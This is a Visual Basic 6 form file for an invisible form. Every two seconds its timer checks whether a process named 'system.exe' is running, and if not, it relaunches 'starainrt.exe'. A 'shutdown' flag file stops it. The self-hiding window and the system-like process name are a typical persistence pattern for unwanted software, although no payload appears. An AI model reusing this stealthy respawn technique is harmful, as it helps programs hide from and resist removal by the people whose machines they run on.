VERSION 5.00
Begin VB.Form frmpro 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   420
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   435
   Icon            =   "frmpro.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   420
   ScaleWidth      =   435
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  '窗口缺省
   WindowState     =   1  'Minimized
   Begin VB.Timer Timer1 
      Interval        =   2000
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "frmpro"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Type PROCESSENTRY32
dwSize As Long
cntUsage As Long
th32ProcessID As Long
th32DefaultHeapID As Long
th32ModuleID As Long
cntThreads As Long
th32ParentProcessID As Long
pcPriClassBase As Long
dwFlags As Long
szExeFile As String * 1024
End Type
Const TH32CS_SNAPHEAPLIST = &H1
Const TH32CS_SNAPPROCESS = &H2
Const TH32CS_SNAPTHREAD = &H4
Const TH32CS_SNAPMODULE = &H8
Const TH32CS_SNAPALL = (TH32CS_SNAPHEAPLIST Or TH32CS_SNAPPROCESS Or TH32CS_SNAPTHREAD Or TH32CS_SNAPMODULE)
Const TH32CS_INHERIT = &H80000000
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Private Declare Function Process32First Lib "kernel32" (ByVal hSnapshot As Long, lppe As PROCESSENTRY32) As Long
Private Declare Function Process32Next Lib "kernel32" (ByVal hSnapshot As Long, lppe As PROCESSENTRY32) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

'查找进程的函数
Private Function fun_FindProcess(ByVal ProcessName As String) As Long
Dim strdata As String
Dim my As PROCESSENTRY32
Dim l As Long
Dim l1 As Long
Dim mName As String
Dim i As Integer, pid As Long
l = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
If l Then
my.dwSize = 1060
If (Process32First(l, my)) Then
Do
i = InStr(1, my.szExeFile, Chr(0))
mName = LCase(Left(my.szExeFile, i - 1))
If mName = LCase(ProcessName) Then
pid = my.th32ProcessID
fun_FindProcess = pid
Exit Function
End If
Loop Until (Process32Next(l, my) < 1)
End If
l1 = CloseHandle(l)
End If
fun_FindProcess = 0
End Function
Private Sub Form_Load()
    App.TaskVisible = False
    Me.Visible = False
End Sub

Private Sub Timer1_Timer()
On Error Resume Next
Dim nfso As New FileSystemObject, temp As String
   If fun_FindProcess("system.exe") = 0 Then  '
      ShellExecute Me.hwnd, "open", GetPath & "starainrt.exe", "RainwithnoPassword", "", 1
    End If
    If nfso.FileExists(GetPath & "system") Then
        Open GetPath & "system" For Input As #1
        Line Input #1, temp
        Close #1
        If temp = "shutdown" Then End
    End If
End Sub
